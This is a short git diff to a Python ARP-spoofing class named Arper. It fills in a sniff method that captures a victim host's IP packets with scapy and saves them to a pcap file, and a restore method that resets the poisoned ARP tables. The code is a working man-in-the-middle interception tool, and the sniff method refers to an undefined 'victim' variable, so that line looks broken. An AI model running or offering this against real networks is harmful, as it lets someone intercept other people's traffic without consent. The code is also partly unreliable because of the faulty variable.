@@ -74,10 +74,19 @@ class Arper:
                 time.sleep(2)
 
     def sniff(self, count=200):
-        pass
+        time.sleep(5)
+        print(f'Sniffing {count} packets')
+        bpf_filter = "ip host %s" % victim
+        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
+        wrpcap('arper.pcap', packets)
+        print("Got the packets")
+        self.restore()
+        self.poison_thread.terminate()
 
     def restore(self):
-        pass
+        print("Restoring ARP tables")
+        send(ARP(op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
+        send(ARP(op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
 
 
 if __name__ == '__main__':
